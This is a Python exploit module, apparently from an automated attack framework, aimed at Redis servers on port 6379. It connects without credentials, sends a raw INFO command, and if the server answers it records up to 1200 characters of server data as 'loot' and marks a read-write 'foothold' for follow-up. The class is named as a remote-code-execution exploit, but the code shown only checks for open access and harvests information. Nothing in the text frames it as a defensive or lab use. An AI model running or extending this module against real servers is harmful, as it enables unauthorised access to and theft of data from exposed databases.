class RedisUnauthRCE(Exploit):
    name = "redis_unauth_rce"
    ports = [6379]; severity = 9; proto = "tcp"
    async def run(self, host, port, ctx):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=BASE_TIMEOUT)
            w.write(b"*1\r\n$4\r\nINFO\r\n"); await w.drain()
            data = await asyncio.wait_for(r.read(4096), timeout=BASE_TIMEOUT)
            w.close(); await w.wait_closed()
            if b"redis_version" in data:
                return ExploitResult(True, "Redis unauthenticated access verified", self.severity,
                                     loot={"info": data.decode(errors="ignore")[:1200]},
                                     foothold={"kind": "redis-rw", "proto": "tcp", "host": host, "port": port})
        except Exception: pass
        return ExploitResult(False)

